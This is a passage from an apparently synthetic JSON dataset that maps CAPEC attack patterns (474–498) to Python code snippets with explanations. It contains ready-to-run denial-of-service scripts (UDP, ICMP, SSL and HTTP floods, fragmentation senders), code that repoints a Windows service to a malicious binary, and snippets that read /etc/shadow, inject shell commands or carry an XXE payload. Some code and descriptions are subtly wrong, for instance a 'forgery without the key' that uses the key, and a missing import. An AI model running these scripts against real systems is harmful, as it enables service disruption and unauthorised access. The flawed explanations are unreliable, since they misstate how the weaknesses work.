        "code_snippet": "import hashlib\nimport hmac\n\n# Simulate a message and a fake signature\nmessage = b'This is a secure message.'\nsecret_key = b'secret'\n\n# Vulnerable: Using a weak hash function (MD5) for HMAC\nfake_signature = hmac.new(secret_key, message, hashlib.md5).hexdigest()\n\n# Simulate receiving the message and signature\nreceived_message = message\nreceived_signature = fake_signature\n\n# Vulnerable: Improper input validation and weak cryptographic algorithm\nif hmac.new(secret_key, received_message, hashlib.md5).hexdigest() == received_signature:\n    print('Message is from a trusted source.')\nelse:\n    print('Message integrity check failed.')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of message signing and verification, embodying the 'Signature Spoof' CAPEC. The code uses a weak cryptographic algorithm (MD5) for HMAC, which is susceptible to collision attacks (CWE-327). It also lacks proper input validation (CWE-20) and does not ensure message integrity during transmission (CWE-924). An attacker could exploit these weaknesses to spoof the signature, making the recipient believe the message is from a trusted source, leading to potential malicious actions."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "import os\nimport hashlib\nimport hmac\n\n# Simulate storing a private key insecurely\nprivate_key = 'super_secret_key'\n\n# Function to sign a message\ndef sign_message(message, key):\n    return hmac.new(key.encode(), message.encode(), hashlib.sha256).hexdigest()\n\n# Function to verify a message\ndef verify_message(message, signature, key):\n    expected_signature = sign_message(message, key)\n    return hmac.compare_digest(expected_signature, signature)\n\n# Attacker steals the private key\nstolen_key = private_key  # CWE-522: Insufficiently Protected Credentials\n\n# Attacker forges a signature\nmessage = 'Transfer $1000 to attacker'\nforged_signature = sign_message(message, stolen_key)\n\n# Victim verifies the forged message\nif verify_message(message, forged_signature, private_key):\n    print('Message verified and action performed!')  # CWE-290: Authentication Bypass by Spoofing\nelse:\n    print('Message verification failed!')",
        "description": "This Python code snippet demonstrates a scenario where an attacker steals a private key (CWE-522: Insufficiently Protected Credentials) and uses it to forge a signature. The attacker then sends a malicious message with the forged signature to the victim. The victim, unaware of the key theft, verifies the message using the stolen key and performs the action, leading to an authentication bypass (CWE-290: Authentication Bypass by Spoofing). This embodies the main idea of CAPEC- Signature Spoofing by Key Theft."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated verification function\ndef verify_signature(message, signature, key):\n    # Using a weak hash function (MD5) which is considered broken\n    expected_signature = hmac.new(key.encode(), message.encode(), hashlib.md5).hexdigest()\n    return expected_signature == signature\n\n# Example usage\nmessage = 'Important message'\nkey = 'secret_key'\n\n# Adversary can generate a valid signature without knowing the key due to weak algorithm\nforged_signature = hmac.new(key.encode(), message.encode(), hashlib.md5).hexdigest()\n\n# Verification should fail but it passes due to weak algorithm\nif verify_signature(message, forged_signature, key):\n    print('Signature is valid')\nelse:\n    print('Signature is invalid')",
        "description": "This Python code snippet demonstrates a vulnerable signature verification process. The `verify_signature` function uses the MD5 hash function, which is known to be broken and susceptible to collision attacks (CWE-327). An adversary can exploit this weakness to generate a valid signature without knowing the secret key, leading to improper verification of the cryptographic signature (CWE-347). The example shows how an attacker can forge a signature that passes the verification check, highlighting the risk of using broken cryptographic algorithms."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated function to verify a signature\n# CWE-347: Improper Verification of Cryptographic Signature\ndef verify_signature(message, signature, secret_key):\n    expected_signature = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).hexdigest()\n    return hmac.compare_digest(expected_signature, signature)\n\n# Simulated function to parse and display a message\n# CWE-290: Authentication Bypass by Spoofing\ndef parse_message(data_blob):\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # CWE-300: Channel Accessible by Non-Endpoint\n    try:\n        message, signature = data_blob.split(':')\n        if verify_signature(message, signature, 'secret_key'):\n            print(f\"Message from trusted source: {message}\")\n        else:\n            print(\"Signature verification failed!\")\n    except Exception as e:\n        print(f\"Error parsing message: {e}\")\n\n# Simulated attacker creating a spoofed data blob\nattacker_message = \"Important update\"\nattacker_signature = \"fake_signature\"\nspoofed_data_blob = f\"{attacker_message}:{attacker_signature}\"\n\n# Victim parsing the spoofed message\nparse_message(spoofed_data_blob)",
        "description": "This Python code snippet demonstrates a scenario where an attacker exploits weaknesses in signature verification and message parsing to spoof a signature. The `verify_signature` function is intended to verify the cryptographic signature of a message, but it is vulnerable to CWE-347 (Improper Verification of Cryptographic Signature) because it uses a hardcoded secret key and does not handle key management securely. The `parse_message` function simulates the parsing and display of a message, but it is vulnerable to multiple weaknesses: CWE-290 (Authentication Bypass by Spoofing), CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), and CWE-300 (Channel Accessible by Non-Endpoint). An attacker can create a spoofed data blob with a fake signature, which the victim's software incorrectly parses and displays, leading to potential compromising actions."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulate signed and unsigned content\nsigned_content = b'Signed data'\nunsigned_content = b'Unsigned data'\n\n# Secret key for HMAC\nsecret_key = b'secret'\n\n# Generate HMAC for signed content\nsigned_hmac = hmac.new(secret_key, signed_content, hashlib.sha256).hexdigest()\n\n# Function to verify HMAC\ndef verify_hmac(content, received_hmac):\n    expected_hmac = hmac.new(secret_key, content, hashlib.sha256).hexdigest()\n    return hmac.compare_digest(expected_hmac, received_hmac)\n\n# Vulnerable function that processes both signed and unsigned content\n# without proper verification\n\ndef process_content(content, received_hmac=None):\n    if received_hmac:\n        if verify_hmac(content, received_hmac):\n            print(\"Signed content verified and processed.\")\n        else:\n            print(\"Invalid HMAC. Content rejected.\")\n    else:\n        print(\"Unsigned content processed without verification.\")\n\n# Example usage\nprocess_content(signed_content, signed_hmac)  # Signed content\nprocess_content(unsigned_content)  # Unsigned content",
        "description": "This Python code snippet demonstrates a vulnerability where both signed and unsigned content are processed by the same function without proper distinction. The `process_content` function processes signed content by verifying its HMAC, but it also processes unsigned content without any verification. This embodies the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content' by showing how unsigned data can be processed as though it were signed data. The related CWEs are represented as follows: CWE-347 (Improper Verification of Cryptographic Signature) is shown by the verification process, CWE-693 (Protection Mechanism Failure) is demonstrated by the lack of proper protection for unsigned content, and CWE-196 (Unsigned to Signed Conversion Error) is implied by the potential mishandling of content types."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import win32serviceutil\nimport win32service\nimport win32api\nimport win32con\n\n# Define the service name and the malicious binary path\nservice_name = 'MyService'\nmalicious_binary = 'C:\\malicious\\malicious.exe'\n\n# Open the service manager\nscm_handle = win32service.OpenSCManager(None, None, win32con.SC_MANAGER_ALL_ACCESS)\n\n# Open the service\nservice_handle = win32service.OpenService(scm_handle, service_name, win32con.SERVICE_ALL_ACCESS)\n\n# Change the service configuration to point to the malicious binary\nwin32service.ChangeServiceConfig(\n    service_handle,\n    win32service.SERVICE_NO_CHANGE,\n    win32service.SERVICE_NO_CHANGE,\n    win32service.SERVICE_NO_CHANGE,\n    malicious_binary,\n    None,\n    0,\n    None,\n    None,\n    None,\n    None\n)\n\n# Close the service and service manager handles\nwin32service.CloseServiceHandle(service_handle)\nwin32service.CloseServiceHandle(scm_handle)\n\nprint(f'Service {service_name} configuration modified to execute {malicious_binary}')",
        "description": "This Python code snippet demonstrates how an adversary could exploit improper access control (CWE-284) to modify the configuration of a Windows service to execute a malicious binary. The code uses the `pywin32` library to interact with the Windows Service Control Manager (SCM). It opens the SCM with full access, opens the specified service, and changes its configuration to point to a malicious executable. This represents the main idea of the CAPEC 'Modification of Windows Service Configuration' by showing how an attacker can replace a legitimate service binary with a malicious one, potentially leading to unauthorized code execution with elevated privileges."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import ssl\nimport socket\n\n# Create an SSL context that does not verify certificates\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# Connect to a server with the insecure context\nhostname = 'example.com'\nport = 443\n\nwith socket.create_connection((hostname, port)) as sock:\n    with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n        print(ssock.version())\n        # This will not validate the server's certificate\n        print(ssock.getpeercert())",
        "description": "This Python code snippet demonstrates an insecure SSL/TLS connection by creating an SSL context that does not verify certificates. The context's 'check_hostname' is set to False, and 'verify_mode' is set to 'ssl.CERT_NONE', which means the certificate presented by the server will not be validated. This embodies the main idea of the CAPEC 'Malicious Root Certificate' by showing how an adversary could exploit improper certificate validation (CWE-295) and improper access control (CWE-284) to establish a connection without triggering security warnings. This could allow an adversary to spoof legitimate websites and collect sensitive information such as login credentials."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import os\nimport subprocess\n\n# Vulnerable function that runs a command in a virtualized environment\n# without proper isolation or validation\n\ndef run_command_in_vm(command):\n    # Simulate running a command in a virtual machine\n    vm_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = vm_process.communicate()\n    return stdout, stderr\n\n# Example usage\nif __name__ == '__main__':\n    # This command could be injected by an attacker to escape the VM\n    malicious_command = 'echo \"Escaping VM\" && cat /etc/passwd'\n    output, error = run_command_in_vm(malicious_command)\n    print(output.decode())\n    print(error.decode())",
        "description": "This Python code snippet demonstrates a vulnerable function that runs a command in a virtualized environment without proper isolation or validation. The function `run_command_in_vm` uses `subprocess.Popen` to execute a command, simulating the execution within a virtual machine. An attacker could inject a malicious command to escape the virtualized environment and access sensitive information on the host system, such as the contents of `/etc/passwd`. This example embodies the main idea of the CAPEC 'Escaping Virtualization' by showing how improper isolation and lack of validation can lead to unauthorized access and potential exposure of sensitive information."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import requests\nimport ssl\n\n# Create a custom SSL context to allow blank SNI field (Domainless Fronting)\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# Contradictory destinations: SNI field is blank, Host header is set to a different domain\nurl = 'https://example.com/resource'\nheaders = {\n    'Host': 'malicious.com'\n}\n\n# Send the request with contradictory destinations\nresponse = requests.get(url, headers=headers, verify=False)\n\nprint(response.status_code)\nprint(response.text)",
        "description": "This Python code snippet demonstrates a simplified version of the 'Contradictory Destinations in Traffic Routing Schemes' attack, specifically using the Domainless Fronting technique. The code creates an HTTPS request where the SNI field is left blank (by disabling hostname checking in the SSL context), and the Host header is set to a different domain ('malicious.com'). This can cause the traffic to be routed incorrectly, potentially leading to security vulnerabilities such as data interception or unauthorized access. The code also highlights related weaknesses like improper endpoint restriction (CWE-923) and incorrect destination specification (CWE-941)."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import socket\n\n# Vulnerable server code that does not limit resource allocation\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nprint('Server is listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    # No limit on the number of connections or resources allocated\n    client_socket.send(bytes('Welcome to the server!', 'utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a simple TCP server that is vulnerable to a TCP flood attack. The server listens for incoming connections on port 8080 and accepts them without any limit on the number of connections or resources allocated (CWE-770). This lack of resource allocation control can be exploited by an adversary to perform a TCP flood attack, overwhelming the server and denying legitimate users access to the service. The code does not implement any throttling or resource management, making it susceptible to denial-of-service attacks."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (potentially from an untrusted source)\nxml_data = '''\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n'''\n\ntry:\n    # Parse the XML data without proper validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-230 and CAPEC-231, specifically focusing on CWE-611 (Improper Restriction of XML External Entity Reference). The code parses an XML document that includes an external entity reference, which can lead to an XML External Entity (XXE) attack. The XML data is taken from an untrusted source and is not validated against a schema (CWE-112), allowing the inclusion of potentially harmful entities. This can result in the disclosure of sensitive files or other unintended behaviors. The code highlights the importance of proper XML validation and the risks associated with processing untrusted XML data without adequate security measures."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import random\nimport hashlib\n\n# Weak random number generator\nrandom.seed(12345)\n\n# Generate a 'private key' using a predictable random number\nprivate_key = random.randint(1, 1000000)\n\n# Simulate signing a message\nmessage = 'Important transaction details'\nsignature = hashlib.sha256((message + str(private_key)).encode()).hexdigest()\n\n# Attacker can predict the private key and forge the signature\nattacker_private_key = 12345  # Attacker knows the seed and can predict the private key\nforged_signature = hashlib.sha256((message + str(attacker_private_key)).encode()).hexdigest()\n\nprint(f'Original Signature: {signature}')\nprint(f'Forged Signature: {forged_signature}')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can spoof a digital signature by predicting the private key used for signing. The code uses a weak random number generator with a predictable seed to generate a 'private key'. The message is then signed using this private key. An attacker, knowing the seed, can predict the private key and forge the signature, misleading the victim. This embodies the CAPEC 'Signature Spoofing by Key Recreation' and highlights CWE-330 'Use of Insufficiently Random Values' and CWE-1241 'Use of Predictable Algorithm in Random Number Generator'."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import socket\nimport threading\n\n# Function to perform UDP flood attack\ndef udp_flood(target_ip, target_port, message, duration):\n    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    end_time = time.time() + duration\n    while time.time() < end_time:\n        client.sendto(message.encode(), (target_ip, target_port))\n\n# Parameters for the attack\nTARGET_IP = '192.168.1.1'  # Example target IP\nTARGET_PORT = 80  # Example target port\nMESSAGE = 'A' * 1024  # Message to send\nDURATION = 10  # Duration of the attack in seconds\n\n# Start the attack in multiple threads to increase the flood effect\nthreads = []\nfor _ in range(10):  # Number of threads\n    thread = threading.Thread(target=udp_flood, args=(TARGET_IP, TARGET_PORT, MESSAGE, DURATION))\n    thread.start()\n    threads.append(thread)\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a UDP flood attack, which is a type of denial-of-service (DoS) attack. The code creates multiple threads to send a large volume of UDP packets to a target IP and port, overwhelming the target's network resources. The attack duration and message size can be adjusted. This code embodies the main idea of CAPEC-UDP Flood and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-406 (Insufficient Control of Network Message Volume). The code is for educational purposes only and should not be used maliciously."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import socket\nimport threading\n\n# Function to perform ICMP flood attack\ndef icmp_flood(target_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    packet = b'\\x08\\x00' + b'\\x00' * 46  # ICMP Echo Request with payload\n    while True:\n        sock.sendto(packet, (target_ip, 0))\n\n# Start multiple threads to simulate a flood\nthreads = []\ntarget_ip = '192.168.1.1'  # Example target IP\nfor _ in range(100):  # Number of threads simulating the attack\n    thread = threading.Thread(target=icmp_flood, args=(target_ip,))\n    thread.start()\n    threads.append(thread)\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates an ICMP flood attack, where multiple threads are used to send a high rate of ICMP Echo Request packets to a target IP address. The code creates a raw socket and continuously sends ICMP packets to the target, consuming network bandwidth and potentially denying service to legitimate users. This embodies the main idea of the CAPEC 'ICMP Flood' attack. The code also indirectly highlights CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of threads or the rate of packet sending, leading to resource exhaustion. Additionally, the use of raw sockets and the potential for spoofing the source IP address align with the session-less nature of ICMP, making it difficult to trace the attack source."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "from flask import Flask, request\nimport threading\n\napp = Flask(__name__)\n\n# Simulate resource allocation without limits\nactive_sessions = []\n\n@app.route('/resource', methods=['GET'])\ndef allocate_resource():\n    session_id = request.args.get('session_id')\n    if session_id:\n        # Allocate resource without any limit or throttling\n        active_sessions.append(session_id)\n        return f'Resource allocated for session {session_id}', 200\n    return 'Invalid session', 400\n\n# Function to simulate HTTP flood attack\ndef http_flood_attack():\n    import requests\n    while True:\n        requests.get('http://localhost:5000/resource?session_id=attacker')\n\nif __name__ == '__main__':\n    # Start the HTTP flood attack in a separate thread\n    threading.Thread(target=http_flood_attack).start()\n    # Run the Flask app\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask framework to create a simple web application that simulates an HTTP flood attack. The '/resource' endpoint allocates resources based on a session ID provided in the query string. The code does not impose any limits or throttling on the number of resources allocated, embodying CWE-770 (Allocation of Resources Without Limits or Throttling). A separate thread runs a function that continuously sends HTTP GET requests to the '/resource' endpoint, simulating an HTTP flood attack. This attack consumes server resources, making it difficult for legitimate users to access the service, which is the main idea of the CAPEC (HTTP Flood)."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import ssl\nimport socket\nimport threading\n\n# Function to create SSL connections and flood the server\ndef ssl_flood(target_host, target_port):\n    context = ssl.create_default_context()\n    while True:\n        try:\n            with socket.create_connection((target_host, target_port)) as sock:\n                with context.wrap_socket(sock, server_hostname=target_host) as ssock:\n                    # Renegotiate SSL connection to consume server resources\n                    ssock.do_handshake()\n        except Exception as e:\n            pass\n\n# Target server details\nhost = 'example.com'\nport = 443\n\n# Launch multiple threads to simulate a flood attack\nthreads = []\nfor _ in range(100):  # Adjust the number of threads as needed\n    thread = threading.Thread(target=ssl_flood, args=(host, port))\n    thread.start()\n    threads.append(thread)\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a simplified version of an SSL Flood attack. The code creates multiple threads, each of which establishes an SSL connection to a target server and repeatedly renegotiates the SSL handshake. This process consumes significant server resources, potentially leading to a denial of service for legitimate users. The code embodies the main idea of CAPEC-489 (SSL Flood) and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption). The attack exploits the asymmetric resource consumption between the client and server during SSL handshake renegotiation."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import socket\n\n# Vulnerable UDP server that can be exploited for amplification attacks\ndef udp_amplification_server(host='0.0.0.0', port=12345):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind((host, port))\n    print(f'Server listening on {host}:{port}')\n\n    while True:\n        data, addr = sock.recvfrom(1024)  # Receive request\n        print(f'Received {len(data)} bytes from {addr}')\n\n        # Vulnerable amplification response\n        response = b'A' * 4096  # Amplified response\n        sock.sendto(response, addr)\n        print(f'Sent {len(response)} bytes to {addr}')\n\nif __name__ == '__main__':\n    udp_amplification_server()",
        "description": "This Python code snippet demonstrates a vulnerable UDP server that can be exploited for amplification attacks. The server listens for incoming UDP packets and responds with a much larger payload, embodying the concept of amplification. The server does not impose any restrictions on the size or number of resources allocated (CWE-770), does not control the volume of network traffic (CWE-406), and performs the amplification before any authentication or authorization (CWE-408). This makes it susceptible to being used in a DDoS attack where an adversary can send small requests to the server, spoofing the source address to be that of a target server, causing the server to send large responses to the target, overwhelming it with traffic."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Define a large entity\nlarge_entity = \"<entity>\" + \"A\" * 1000000 + \"</entity>\"\n\n# Create an XML structure with multiple references to the large entity\nxml_data = \"<root>\" + large_entity * 100 + \"</root>\"\n\n# Parse the XML data\ntry:\n    root = ET.fromstring(xml_data)\n    print(\"XML parsed successfully.\")\nexcept MemoryError:\n    print(\"MemoryError: The XML data is too large to parse.\")\n",
        "description": "This Python code snippet demonstrates a Quadratic Data Expansion attack by creating an XML structure that includes a very large entity repeated multiple times. The `large_entity` is defined with a million 'A' characters, and the `xml_data` string includes this entity 100 times within a root element. When attempting to parse this XML data using the `xml.etree.ElementTree` module, it can lead to excessive memory allocation, potentially causing a denial of service (DoS) due to memory exhaustion. This example embodies the main idea of CAPEC-197 and related CWEs, such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation)."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import re\n\ndef vulnerable_regex(input_string):\n    # CWE-1333: Inefficient Regular Expression Complexity\n    # This regex can cause exponential backtracking\n    pattern = re.compile(r'(a+)+$')\n    if pattern.match(input_string):\n        return 'Match found'\n    else:\n        return 'No match'\n\n# Example input that causes exponential blowup\ninput_string = 'a' * 30 + '!'  # This input will cause the regex to backtrack excessively\nprint(vulnerable_regex(input_string))",
        "description": "This Python code snippet demonstrates a vulnerable regular expression that can lead to exponential blowup, as described in the CAPEC. The regular expression `(a+)+$` is inefficient and can cause excessive backtracking, leading to high CPU consumption. This is an example of CWE-1333 (Inefficient Regular Expression Complexity). The input string 'a' * 30 + '!' is designed to trigger this inefficiency, causing the regex engine to consume excessive resources. This snippet highlights the importance of using efficient regular expressions to avoid uncontrolled resource consumption (CWE-400)."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Example SOAP message with a large array declaration\nsoap_message = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <ns1:largeArray xmlns:ns1=\"http://example.com/\">\n         <ns1:array>\n            <ns1:item>1</ns1:item>\n            <ns1:item>2</ns1:item>\n            <!-- Imagine 1,000,000 items here -->\n         </ns1:array>\n      </ns1:largeArray>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\ntry:\n    # Parse the SOAP message\n    root = ET.fromstring(soap_message)\n    # Extract the array elements\n    array_elements = root.findall('.//ns1:item', {'ns1': 'http://example.com/'})\n    # Allocate memory for the array elements\n    array = [None] * len(array_elements)\n    for i, elem in enumerate(array_elements):\n        array[i] = elem.text\n    print(f\"Allocated array with {len(array)} elements.\")\nexcept ET.ParseError as e:\n    print(f\"XML parsing error: {e}\")\nexcept MemoryError as e:\n    print(f\"Memory allocation error: {e}\")",
        "description": "This Python code snippet demonstrates a SOAP Array Blowup attack. It constructs a SOAP message with a large array declaration and attempts to parse and allocate memory for the array elements. The code uses the xml.etree.ElementTree module to parse the SOAP message and extract the array elements. The array is then allocated based on the number of elements found. This example highlights the potential for memory exhaustion when handling large SOAP arrays without proper limits or throttling, as described in CWE-770 and CWE-1325. Additionally, it shows the importance of proper XML parsing and handling to avoid issues like CWE-611."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import socket\n\n# Create a raw socket\ns = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a fragmented TCP packet\n# Fragment 1: TCP header without flags\nfragment1 = b'\\x45\\x00\\x00\\x1c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6\\xc0\\xa8\\x00\\x68\\xc0\\xa8\\x00\\x01'  # IP header\nfragment1 += b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x20\\x00\\x72\\x10\\x00\\x00'  # TCP header without flags\n\n# Fragment 2: TCP flags\nfragment2 = b'\\x45\\x00\\x00\\x14\\x1c\\x47\\x40\\x00\\x40\\x06\\xb1\\xe5\\xc0\\xa8\\x00\\x68\\xc0\\xa8\\x00\\x01'  # IP header\nfragment2 += b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x18\\x20\\x00\\x72\\x10\\x00\\x00'  # TCP flags\n\n# Send the fragments\ns.sendto(fragment1, ('192.168.0.1', 0))\ns.sendto(fragment2, ('192.168.0.1', 0))\n\n# Note: This code is for educational purposes only and should not be used for malicious activities.",
        "description": "This Python code snippet demonstrates a TCP Fragmentation attack. It creates a raw socket and constructs two TCP packet fragments. The first fragment contains the TCP header without the flags, and the second fragment contains the TCP flags. By sending these fragments separately, the attacker aims to bypass network filtering rules that typically inspect the TCP flags. This code also touches on CWE-770 (resource allocation without limits) by not limiting the number of fragments sent, CWE-404 (improper resource shutdown) by not properly closing the socket, and CWE-319 (cleartext transmission) by sending data in cleartext. The code is intended for educational purposes to illustrate the concept of TCP Fragmentation attacks and should not be used maliciously."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import socket\nimport random\n\n# Configuration\nTARGET_IP = '192.168.1.1'\nTARGET_PORT = 12345\nPACKET_SIZE = 2000  # Larger than typical MTU to force fragmentation\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# Generate a large payload to force fragmentation\npayload = bytearray(random.getrandbits(8) for _ in range(PACKET_SIZE))\n\ntry:\n    while True:\n        # Send the payload to the target\n        sock.sendto(payload, (TARGET_IP, TARGET_PORT))\n        print(f'Sent packet to {TARGET_IP}:{TARGET_PORT}')\nexcept KeyboardInterrupt:\n    print('Attack stopped.')\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a UDP Fragmentation attack. The script creates a UDP socket and sends large UDP packets (2000 bytes) to a target IP and port, which forces IP fragmentation as the packet size exceeds the typical MTU of 1500 bytes. This can consume network bandwidth and server resources, such as CPU and memory, as the server attempts to reassemble the fragmented packets. The code embodies the main idea of the CAPEC by illustrating how an attacker can exploit resource allocation without limits (CWE-770) and insufficient control of network message volume (CWE-406) to perform a denial-of-service attack."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import socket\n\n# Function to create a fragmented ICMP packet\ndef create_fragmented_icmp_packet(fragment_size):\n    icmp_header = b'\\x08\\x00'  # ICMP Echo Request\n    payload = b'A' * fragment_size\n    return icmp_header + payload\n\n# Function to send fragmented ICMP packets\ndef send_fragmented_icmp(target_ip, fragment_size, num_fragments):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    for _ in range(num_fragments):\n        packet = create_fragmented_icmp_packet(fragment_size)\n        sock.sendto(packet, (target_ip, 1))\n    sock.close()\n\n# Target IP and parameters\nTARGET_IP = '192.168.1.1'\nFRAGMENT_SIZE = 1480  # Fragment size\nNUM_FRAGMENTS = 10000  # Number of fragments to send\n\n# Send fragmented ICMP packets to the target\nsend_fragmented_icmp(TARGET_IP, FRAGMENT_SIZE, NUM_FRAGMENTS)",
        "description": "This Python code snippet demonstrates a basic implementation of an ICMP Fragmentation attack. The `create_fragmented_icmp_packet` function generates a fragmented ICMP packet with a specified fragment size. The `send_fragmented_icmp` function sends a large number of these fragmented packets to a target IP address. The parameters `TARGET_IP`, `FRAGMENT_SIZE`, and `NUM_FRAGMENTS` define the target IP address, the size of each fragment, and the number of fragments to send, respectively. This code embodies the main idea of the CAPEC by attempting to overwhelm the target system with fragmented ICMP packets, potentially leading to resource exhaustion or a crash. The related CWEs provide additional context, such as the lack of resource limits (CWE-770) and improper resource release (CWE-404), which can exacerbate the impact of such an attack."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import os\n\n# CWE-73: External Control of File Name or Path\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-426: Untrusted Search Path\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef find_sensitive_files(base_path, file_list):\n    sensitive_files = []\n    for file_name in file_list:\n        file_path = os.path.join(base_path, file_name)\n        if os.path.exists(file_path):\n            with open(file_path, 'r') as file:\n                content = file.read()\n                sensitive_files.append((file_path, content))\n    return sensitive_files\n\n# Example usage\nbase_path = \"/etc\"\nfile_list = [\"passwd\", \"shadow\", \"hosts\"]\nsensitive_files = find_sensitive_files(base_path, file_list)\nfor file_path, content in sensitive_files:\n    print(f\"Found sensitive file: {file_path}\")\n    print(content)\n",
        "description": "This Python code snippet demonstrates a file discovery process that an adversary might use to locate and read sensitive files on a system. The function `find_sensitive_files` takes a base directory path and a list of filenames to search for. It constructs the full path for each file and checks if it exists. If the file exists, it reads and stores the file's content. This embodies the CAPEC 'File Discovery' by probing for key files that may contain sensitive information. The code also touches on several related CWEs: CWE-73 (external control of file paths), CWE-200 (exposure of sensitive information), CWE-529 (exposure of access control list files), CWE-426 (untrusted search path), and CWE-646 (reliance on file name or extension). The example usage demonstrates searching for common sensitive files in the '/etc' directory."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
